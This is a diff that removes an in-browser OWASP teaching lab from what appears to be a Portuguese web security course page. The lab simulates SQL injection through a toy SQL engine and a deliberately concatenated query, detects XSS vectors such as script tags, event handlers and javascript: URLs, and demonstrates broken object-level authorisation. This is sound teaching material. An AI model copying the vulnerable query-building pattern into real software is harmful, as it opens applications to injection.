-        return t;
-    }
-    function parsear(tokens, param) {
-        var pos = 0;
-        function ver() { return tokens[pos]; }
-        function eKw(v) { var x = tokens[pos]; return x && x.t === "kw" && x.v === v; }
-        function eOp(v) { var x = tokens[pos]; return x && x.t === "op" && x.v === v; }
-        function perto() { var x = tokens[pos]; return x ? (x.t === "str" ? "'" + x.v + "'" : String(x.v === undefined ? "?" : x.v)) : ""; }
-        function falhar() { throw erroSql(pos < tokens.length ? "near \"" + perto() + "\": syntax error" : "incomplete input"); }
-        function consulta() {
-            var partes = [{ sel: select(), all: false }];
-            while (eKw("UNION")) {
-                pos++;
-                var all = false;
-                if (eKw("ALL")) { all = true; pos++; }
-                partes.push({ sel: select(), all: all });
-            }
-            return partes;
-        }
-        function select() {
-            if (!eKw("SELECT")) falhar();
-            pos++;
-            var cols = [];
-            do {
-                if (cols.length) pos++;
-                if (eOp("*")) { pos++; cols.push({ estrela: true }); }
-                else cols.push({ expr: expressao() });
-            } while (eOp(","));
-            if (!eKw("FROM")) falhar();
-            pos++;
-            var tab = ver();
-            if (!tab || tab.t !== "id") falhar();
-            pos++;
-            var where = null;
-            if (eKw("WHERE")) { pos++; where = expressao(); }
-            return { cols: cols, tabela: tab.v, where: where };
-        }
-        function expressao() { return ou(); }
-        function ou() { var a = e_(); while (eKw("OR")) { pos++; a = { op: "OR", a: a, b: e_() }; } return a; }
-        function e_() { var a = nao(); while (eKw("AND")) { pos++; a = { op: "AND", a: a, b: nao() }; } return a; }
-        function nao() { if (eKw("NOT")) { pos++; return { op: "NOT", a: nao() }; } return comparacao(); }
-        function comparacao() {
-            var a = primario();
-            var x = ver();
-            if (x && x.t === "op" && ["=", "<>", "!=", "<", ">", "<=", ">="].indexOf(x.v) !== -1) { pos++; return { op: x.v, a: a, b: primario() }; }
-            if (eKw("LIKE")) { pos++; return { op: "LIKE", a: a, b: primario() }; }
-            if (eKw("NOT") && tokens[pos + 1] && tokens[pos + 1].t === "kw" && tokens[pos + 1].v === "LIKE") { pos += 2; return { op: "NOT", a: { op: "LIKE", a: a, b: primario() } }; }
-            return a;
-        }
-        function primario() {
-            var x = ver();
-            if (!x) falhar();
-            if (x.t === "str" || x.t === "num") { pos++; return { lit: x.v }; }
-            if (x.t === "param") { pos++; return { lit: param }; }
-            if (x.t === "kw" && x.v === "NULL") { pos++; return { lit: null }; }
-            if (x.t === "id") { pos++; return { col: x.v }; }
-            if (eOp("(")) { pos++; var v = expressao(); if (!eOp(")")) falhar(); pos++; return v; }
-            falhar();
-        }
-        var q = consulta();
-        if (eOp(";")) {
-            pos++;
-            if (pos < tokens.length) throw erroSql("You can only execute one statement at a time.");
-        }
-        if (pos < tokens.length) falhar();
-        return q;
-    }
-    function tipoOrdem(v) { return v === null ? 0 : typeof v === "number" ? 1 : 2; }
-    function cmp(a, b) {
-        var ta = tipoOrdem(a), tb = tipoOrdem(b);
-        if (ta !== tb) return ta - tb;
-        if (ta === 0) return 0;
-        if (ta === 1) return a - b;
-        return a < b ? -1 : a > b ? 1 : 0;
-    }
-    function numerico(v) { if (typeof v === "number") return v; if (v === null) return null; var m = String(v).match(/^\s*-?\d+(\.\d+)?/); return m ? Number(m[0]) : 0; }
-    function like(v, padrao) {
-        if (v === null || padrao === null) return null;
-        var re = "^" + String(padrao).replace(/[.+^${}()|[\]\\*?]/g, "\\$&").replace(/%/g, "[\\s\\S]*").replace(/_/g, "[\\s\\S]") + "$";
-        return new RegExp(re, "i").test(String(v));
-    }
-    function avaliar(n, linha, colunas) {
-        if ("lit" in n) return n.lit;
-        if (n.col !== undefined) {
-            var i = colunas.map(function(c) { return c.toLowerCase(); }).indexOf(n.col.toLowerCase());
-            if (i === -1) throw erroSql("no such column: " + n.col);
-            return linha[i];
-        }
-        if (n.op === "AND") { var a = verdade(avaliar(n.a, linha, colunas)); var b = verdade(avaliar(n.b, linha, colunas)); return a === false || b === false ? 0 : (a === null || b === null ? null : 1); }
-        if (n.op === "OR") { var c = verdade(avaliar(n.a, linha, colunas)); var d = verdade(avaliar(n.b, linha, colunas)); return c === true || d === true ? 1 : (c === null || d === null ? null : 0); }
-        if (n.op === "NOT") { var e = verdade(avaliar(n.a, linha, colunas)); return e === null ? null : (e ? 0 : 1); }
-        var x = avaliar(n.a, linha, colunas), y = avaliar(n.b, linha, colunas);
-        if (n.op === "LIKE") { var r = like(x, y); return r === null ? null : (r ? 1 : 0); }
-        if (x === null || y === null) return null;
-        if (tipoOrdem(x) !== tipoOrdem(y)) return (n.op === "<>" || n.op === "!=") ? 1 : (n.op === "=" ? 0 : (cmp(x, y) < 0 ? (n.op === "<" || n.op === "<=" ? 1 : 0) : (n.op === ">" || n.op === ">=" ? 1 : 0)));
-        var k = cmp(x, y);
-        return ({ "=": k === 0, "<>": k !== 0, "!=": k !== 0, "<": k < 0, ">": k > 0, "<=": k <= 0, ">=": k >= 0 })[n.op] ? 1 : 0;
-    }
-    function verdade(v) { if (v === null) return null; return numerico(v) !== 0; }
-    function executarSql(sql, param) {
-        var q = parsear(tokenizar(sql), param);
-        var resultados = q.map(function(p) {
-            var s = p.sel, tab = OW.banco[s.tabela];
-            if (!tab) throw erroSql("no such table: " + s.tabela);
-            var linhas = tab.linhas.filter(function(l) { return !s.where || verdade(avaliar(s.where, l, tab.colunas)) === true; });
-            var nomes = [];
-            s.cols.forEach(function(c) {
-                if (c.estrela) tab.colunas.forEach(function(n) { nomes.push(n); });
-                else nomes.push(c.expr.col !== undefined ? c.expr.col : (c.expr.lit === null ? "NULL" : String(c.expr.lit)));
-            });
-            var proj = linhas.map(function(l) {
-                var out = [];
-                s.cols.forEach(function(c) {
-                    if (c.estrela) l.forEach(function(v) { out.push(v); });
-                    else out.push(avaliar(c.expr, l, tab.colunas));
-                });
-                return out;
-            });
-            return { nomes: nomes, linhas: proj, all: p.all };
-        });
-        var base = resultados[0];
-        for (var i = 1; i < resultados.length; i++) {
-            if (resultados[i].nomes.length !== base.nomes.length) throw erroSql("SELECTs to the left and right of UNION do not have the same number of result columns");
-        }
-        if (resultados.length === 1) return { colunas: base.nomes, linhas: base.linhas };
-        var linhas = base.linhas.slice();
-        var dedup = resultados.slice(1).some(function(r) { return !r.all; });
-        resultados.slice(1).forEach(function(r) { linhas = linhas.concat(r.linhas); });
-        if (dedup) {
-            linhas.sort(function(a, b) { for (var k = 0; k < a.length; k++) { var c = cmp(a[k], b[k]); if (c) return c; } return 0; });
-            linhas = linhas.filter(function(l, i) { return i === 0 || l.some(function(v, k) { return cmp(v, linhas[i - 1][k]) !== 0; }); });
-        }
-        return { colunas: base.nomes, linhas: linhas };
-    }
-    window.executarSqlOwasp = function(sql, param) {
-        try { return { ok: true, r: executarSql(sql, param) }; }
-        catch (e) { if (!e.sql) throw e; return { ok: false, erro: e.message }; }
-    };
-
-    // ===================================================== missões
-    function concluir(id) {
-        if (feitas[id]) return;
-        feitas[id] = true;
-        renderizarMissoes();
-    }
-    function renderizarMissoes() {
-        var ul = document.getElementById("ow-missoes");
-        ul.replaceChildren();
-        OW.missoes.forEach(function(m) {
-            var li = el("li", (feitas[m.id] ? "✓ " : "○ ") + m.texto, "color: " + (feitas[m.id] ? "var(--tip-color)" : "var(--ink)") + ";");
-            li.setAttribute("data-missao", m.id);
-            li.setAttribute("data-feita", feitas[m.id] ? "sim" : "nao");
-            ul.appendChild(li);
-        });
-    }
-
-    // ===================================================== busca (SQLi)
-    window.executarBuscaOwasp = function() {
-        var termo = document.getElementById("ow-busca").value;
-        var param = document.getElementById("ow-param").checked;
-        var cons = document.getElementById("ow-sql-consulta"), box = document.getElementById("ow-sql-resultado");
-        cons.replaceChildren(); box.replaceChildren();
-        var sql = param ? OW.sql_parametrizado : OW.sql_modelo.replace("{termo}", termo);
-        cons.appendChild(el("div", "SQL executado: " + sql));
-        if (param) cons.appendChild(el("div", "Parâmetro ligado ao ?: '%" + termo + "%' (sempre tratado como texto)"));
-        var res = window.executarSqlOwasp(sql, param ? "%" + termo + "%" : undefined);
-        box.setAttribute("data-ok", res.ok ? "sim" : "nao");
-        if (!res.ok) {
-            box.appendChild(el("p", "Erro do banco: " + res.erro, "margin: 0; color: var(--danger-color); font-family: var(--font-mono); font-size: 0.8rem;"));
-            box.appendChild(el("p", "Mostrar o erro do banco ao usuário também é falha (A10): revela a estrutura da consulta ao atacante.", "margin: 0.3rem 0 0 0; font-size: 0.8rem; color: var(--muted);"));
-            return;
-        }
-        var r = res.r;
-        box.setAttribute("data-linhas", String(r.linhas.length));
-        box.appendChild(el("p", r.linhas.length + " resultado(s).", "margin: 0 0 0.3rem 0; font-weight: 600;"));
-        if (r.linhas.length) {
-            var t = el("table"); t.className = "data-table";
-            var h = el("tr"); r.colunas.forEach(function(c) { h.appendChild(el("th", c)); });
-            var th = el("thead"); th.appendChild(h); t.appendChild(th);
-            var tb = el("tbody");
-            r.linhas.forEach(function(l) { var tr = el("tr"); l.forEach(function(v) { tr.appendChild(el("td", v === null ? "NULL" : String(v), "overflow-wrap: anywhere;")); }); tb.appendChild(tr); });
-            t.appendChild(tb);
-            var w = el("div"); w.className = "table-responsive"; w.appendChild(t); box.appendChild(w);
-        }
-        var inativos = OW.banco.produtos.linhas.filter(function(l) { return l[3] === 0; }).map(function(l) { return l[1]; });
-        var emails = OW.banco.clientes.linhas.map(function(l) { return l[2]; });
-        var valores = r.linhas.reduce(function(acc, l) { return acc.concat(l.map(String)); }, []);
-        if (!param && valores.some(function(v) { return inativos.indexOf(v) !== -1; })) concluir("sqli_inativos");
-        if (!param && valores.some(function(v) { return emails.indexOf(v) !== -1; })) concluir("sqli_union");
-        if (param && termo.indexOf("'") !== -1 && r.linhas.length === 0) concluir("sqli_param");
-    };
-
-    // ===================================================== comentários (XSS)
-    function codificar(s) {
-        return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#39;");
-    }
-    function vetores(html) {
-        var doc = new DOMParser().parseFromString("<!doctype html><body>" + html, "text/html");
-        var out = [], injetados = 0;
-        Array.prototype.forEach.call(doc.body.querySelectorAll("*"), function(n) {
-            injetados++;
-            var tag = n.tagName.toLowerCase();
-            if (tag === "script") out.push("<script>: executaria o código do bloco");
-            Array.prototype.forEach.call(n.attributes, function(a) {
-                var nome = a.name.toLowerCase(), v = a.value.trim().toLowerCase();
-                if (nome.indexOf("on") === 0) out.push("<" + tag + " " + nome + ">: executaria " + a.value.slice(0, 60));
-                if (["href", "src", "action", "formaction"].indexOf(nome) !== -1 && v.indexOf("javascript:") === 0) out.push("<" + tag + " " + nome + "=javascript:>: executaria ao ser acionado");
-            });
-        });
-        return { lista: out, injetados: injetados };
-    }
-    // A prévia nunca carrega recursos nem executa nada: remove scripts, handlers e endereços antes de exibir.
-    function neutralizar(html) {
-        var doc = new DOMParser().parseFromString("<!doctype html><body>" + html, "text/html");
-        Array.prototype.forEach.call(doc.body.querySelectorAll("script"), function(s) { s.parentNode.removeChild(s); });
-        Array.prototype.forEach.call(doc.body.querySelectorAll("*"), function(n) {
-            Array.prototype.slice.call(n.attributes).forEach(function(a) {
-                var nome = a.name.toLowerCase();
-                if (nome.indexOf("on") === 0 || ["src", "srcset", "href", "action", "formaction", "background", "poster", "data"].indexOf(nome) !== -1) n.removeAttribute(a.name);
-            });
-        });
-        var s = new XMLSerializer();
-        return Array.prototype.map.call(doc.body.childNodes, function(n) { return s.serializeToString(n); }).join("");
-    }
-    function paginaComentarios(corpo, csp) {
-        var meta = csp ? "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; style-src 'unsafe-inline'; img-src data:\">" : "";
-        var antigos = OW.comentarios.map(function(c) { return "<p><b>" + codificar(c.autor) + ":</b> " + codificar(c.texto) + "</p>"; }).join("");
-        return "<!doctype html><html><head><meta charset=\"utf-8\">" + meta + "<style>body{font:14px sans-serif;margin:8px;color:#111}p{margin:4px 0}</style></head><body>" +
-            "<h4 style=\"margin:0 0 6px\">Comentários — Caixa de papelão média</h4>" + antigos + "<p><b>Você:</b> " + corpo + "</p></body></html>";
-    }
-    window.analisarComentarioOwasp = function() {
-        var texto = document.getElementById("ow-comentario").value;
-        var modo = (document.querySelector('input[name="ow-modo"]:checked') || {}).value || "sem";
-        var bruto = vetores(texto);
-        var box = document.getElementById("ow-xss-analise");
-        box.replaceChildren();
-        box.setAttribute("data-modo", modo);
-        var iframe = document.getElementById("ow-xss-previa");
-        if (modo === "codificado") {
-            iframe.srcdoc = paginaComentarios(codificar(texto), false);
-            box.setAttribute("data-vetores", "0");
-            box.appendChild(el("strong", "Codificação de saída: o comentário aparece como texto literal; nenhum vetor executa.", "display: block; color: var(--tip-color);"));
-            if (bruto.lista.length) box.appendChild(el("p", "Sem a codificação, " + bruto.lista.length + " vetor(es) executariam.", "margin: 0.3rem 0 0 0;"));
-            if (bruto.lista.length && ultimoXssVetores === texto) concluir("xss_fix");
-        } else {
-            iframe.srcdoc = paginaComentarios(neutralizar(texto), modo === "csp");
-            var exec = modo === "csp" ? 0 : bruto.lista.length;
-            box.setAttribute("data-vetores", String(exec));
-            box.setAttribute("data-injetados", String(bruto.injetados));
-            if (bruto.lista.length) {
-                if (modo === "csp") {
-                    box.appendChild(el("strong", "A CSP bloquearia os " + bruto.lista.length + " vetor(es) de script, mas o HTML injetado continua na página.", "display: block; color: rgb(234, 88, 12);"));
-                } else {
-                    box.appendChild(el("strong", "XSS: " + bruto.lista.length + " vetor(es) executariam no navegador de quem abrir a página.", "display: block; color: var(--danger-color);"));
-                    ultimoXssVetores = texto;
-                    concluir("xss_vuln");
-                }
-                var ul = el("ul", null, "margin: 0.3rem 0 0 0; padding-left: 1.2rem; font-family: var(--font-mono); font-size: 0.75rem; overflow-wrap: anywhere;");
-                bruto.lista.forEach(function(v) { ul.appendChild(el("li", v)); });
-                box.appendChild(ul);
-            } else if (bruto.injetados) {
-                box.appendChild(el("strong", "Sem script, mas " + bruto.injetados + " elemento(s) HTML foram injetados na página (por exemplo, um formulário falso)." + (modo === "csp" ? " A CSP não impede isso." : ""),
-                    "display: block; color: rgb(234, 88, 12);"));
-            } else {
-                box.appendChild(el("strong", "Comentário só com texto: nada foi injetado.", "display: block;"));
-            }
-            box.appendChild(el("p", "A prévia abaixo mostra o HTML injetado com scripts, eventos e endereços removidos, dentro de um iframe com sandbox vazio: aqui nada executa nem é carregado.", "margin: 0.3rem 0 0 0; font-size: 0.78rem; color: var(--muted);"));
-        }
-    };
-
-    // ===================================================== API de pedidos (BOLA)
-    window.consultarPedidoOwasp = function() {
-        var id = Number(document.getElementById("ow-pedido").value);
-        var checar = document.getElementById("ow-dono").checked;
-        var box = document.getElementById("ow-bola-resposta");
-        var p = OW.pedidos.filter(function(x) { return x.id === id; })[0];
-        var u = OW.usuario_logado;
-        var linhas = ["GET /api/pedidos/" + id + " HTTP/1.1", "Cookie: " + u.sessao, ""];
-        var status;
-        if (!p || (checar && p.cliente_id !== u.cliente_id)) {
-            status = 404;
-            linhas.push("HTTP/1.1 404 Not Found", "", JSON.stringify({ erro: "Pedido não encontrado" }, null, 2));
-            if (p && checar) concluir("bola_fix");
-        } else {
-            status = 200;
-            linhas.push("HTTP/1.1 200 OK", "", JSON.stringify(p, null, 2));
-            if (p.cliente_id !== u.cliente_id) concluir("bola_vuln");
-        }
-        box.textContent = linhas.join("\n");
-        box.setAttribute("data-status", String(status));
-    };
-
-    // ===================================================== geral
-    function exemplos(boxId, lista, alvoId, acao) {
-        var box = document.getElementById(boxId);
-        box.replaceChildren();
-        lista.forEach(function(x) {
-            var b = el("button", x.length > 42 ? x.slice(0, 40) + "…" : x, "font-family: var(--font-mono); font-size: 0.7rem; padding: 0.2rem 0.5rem; overflow-wrap: anywhere; text-align: left;");
-            b.type = "button";
-            b.className = "btn-secondary";
-            b.title = x;
-            b.addEventListener("click", function() { document.getElementById(alvoId).value = x; acao(); });
-            box.appendChild(b);
-        });
-    }
-    window.restaurarOwasp = function() {
-        feitas = {};
-        ultimoXssVetores = null;
-        document.getElementById("ow-param").checked = false;
-        document.getElementById("ow-dono").checked = false;
-        document.getElementById("ow-busca").value = "caixa";
-        document.getElementById("ow-comentario").value = OW.exemplos_xss[0];
-        document.getElementById("ow-pedido").value = "1042";
-        var r = document.querySelector('input[name="ow-modo"][value="sem"]'); if (r) r.checked = true;
-        renderizarMissoes();
-        executarBuscaOwasp();
-        analisarComentarioOwasp();
-        consultarPedidoOwasp();
-    };
-
-    document.addEventListener("DOMContentLoaded", function() {
-        document.getElementById("ow-contexto").textContent = OW.contexto;
-        var tb = document.querySelector("#ow-tabela-top10 tbody");
-        OW.top10.forEach(function(c) {
-            var tr = el("tr");
-            tr.appendChild(el("td", c.id + " " + c.nome, "font-weight: 600;"));
-            tr.appendChild(el("td", c.resumo));
-            tr.appendChild(el("td", c.de_2021));
-            tb.appendChild(tr);
-        });
-        document.getElementById("ow-bola-sessao").textContent = "Sessão atual: " + OW.usuario_logado.nome + " (cliente " + OW.usuario_logado.cliente_id + "). Os pedidos dela são 1042 e 1044.";
-        exemplos("ow-sql-exemplos", OW.exemplos_sql, "ow-busca", executarBuscaOwasp);
-        exemplos("ow-xss-exemplos", OW.exemplos_xss, "ow-comentario", analisarComentarioOwasp);
-        document.getElementById("ow-busca").addEventListener("keydown", function(e) { if (e.key === "Enter") executarBuscaOwasp(); });
-        restaurarOwasp();
-        if (typeof initChecklist === "function") {
-            initChecklist("owasp-web");
-        }
-        if (typeof initQuiz === "function") {
-            initQuiz();
-        }
-    });
-})();
-</script>
+<!-- DADOS Da checklist (lidos pelo motor abaixo e validados pelos testes) -->
 </main>
 </div>
 
@@ -3056,7 +2161,6 @@ Set-Cookie: sessao=...; Secure; HttpOnly; SameSite=Lax</code></pre>
 
   const TIPOS = {
     teoria: { icone: '📘', rotulo: 'Teoria' },
-    laboratorio: { icone: '🧪', rotulo: 'Laboratório' },
     checklist: { icone: '☑️', rotulo: 'Checklist' },
     questoes: { icone: '❓', rotulo: 'Questões de concurso' },
     referencias: { icone: '📚', rotulo: 'Referências' },
@@ -3645,17 +2749,6 @@ Set-Cookie: sessao=...; Secure; HttpOnly; SameSite=Lax</code></pre>
     });
   }
 
-  // Um simulador pode informar o progresso do laboratório ao sumário (opcional).
-  function labProgress(feitos, total) {
-    const secao = secaoDoTipo('laboratorio');
-    const f = Number(feitos);
-    const t = Number(total);
-    if (!Number.isFinite(f) || !Number.isFinite(t) || t <= 0) {
-      definirContador(secao, '');
-      return;
-    }
-    definirContador(secao, `${Math.max(0, Math.min(f, t))}/${t}`);
-  }
 
   // --------------------------------------------------------------------------
   // 6b. Glossário: tooltip dos termos (<dfn class="glossario">)
@@ -3869,7 +2962,6 @@ Set-Cookie: sessao=...; Secure; HttpOnly; SameSite=Lax</code></pre>
   window.CS = {
     init,
     initGlossario,
-    labProgress,
     safeStorageGet,
     safeStorageSet,
     initTheme,
